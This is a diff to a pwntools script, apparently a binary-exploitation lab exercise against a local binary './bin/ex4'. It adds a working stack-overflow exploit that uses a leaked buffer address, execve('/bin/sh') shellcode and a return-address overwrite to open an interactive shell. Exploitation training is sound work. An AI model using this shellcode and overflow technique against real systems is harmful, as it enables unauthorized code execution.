@@ -5,39 +5,59 @@ from pwn import *
 # you have to set this before using asm()
 context.update(arch='amd64', os='linux')
 
+
 target = process("./bin/ex4")
 
-payload = shellcraft.amd64.linux.echo("shellcraft is powerful!")
+# payload = shellcraft.amd64.linux.echo("shellcraft is powerful!")
 
-print(f"Dissassembly: {payload}")
+# print(f"Dissassembly: {payload}")
 
-payload = asm(payload)
-print(f"Bytecode: {payload}")
+# payload = asm(payload)
+# print(f"Bytecode: {payload}")
 
 # get the leak here by parsing from target.recvline()
 
+leak = target.recvline().decode().strip()
+BUFFER_ADDRESS = leak.split(" ")[-1]
 # craft your payload
-# payload = ...
 
-#target.send(payload)
-#target.interactive()
+
+sc = asm("""
+    jmp binsh
+start:
+    pop rdi          /* rdi -> address of the string */
+    mov rsi, 0
+    mov rdx, 0
+    mov rax, 59
+    syscall
+binsh:
+    call start
+    .ascii "/bin/sh\\x00"
+    """)
+
+payload = sc + (256 - len(sc)) * b"F" + 8 * b"F" + p64(int(BUFFER_ADDRESS, 16), "little")
+
+print(len(payload))
+
+target.send(payload)
+target.interactive()
 
 
 # you can also do it by hand, with asm()
 # u64() unpacks bytestrings to numbers
 
-craft_payload = asm(shellcraft.amd64.mov("rdi", u64(b"/bin/cat")))
-hand_payload = asm(f"mov rdi, {u64(b'/bin/cat')}")
+# craft_payload = asm(shellcraft.amd64.mov("rdi", u64(b"/bin/cat")))
+# hand_payload = asm(f"mov rdi, {u64(b'/bin/cat')}")
 
-print(f"AUTO-CRAFTED:\n{disasm(craft_payload)}")
-print(f"HAND-CRAFTED:\n{disasm(hand_payload)}")
+# print(f"AUTO-CRAFTED:\n{disasm(craft_payload)}")
+# print(f"HAND-CRAFTED:\n{disasm(hand_payload)}")
 
-# They are the same in this case
-# but sometimes you want more control over your payloads
+# # They are the same in this case
+# # but sometimes you want more control over your payloads
 
-# Chain the manual assembly:
+# # Chain the manual assembly:
 
-manual = asm("mov rdi, 10")
-manual += asm("xor rdi, 1")
+# manual = asm("mov rdi, 10")
+# manual += asm("xor rdi, 1")
 
-print(f"MANUAL:\n{disasm(manual)}")
+# print(f"MANUAL:\n{disasm(manual)}")
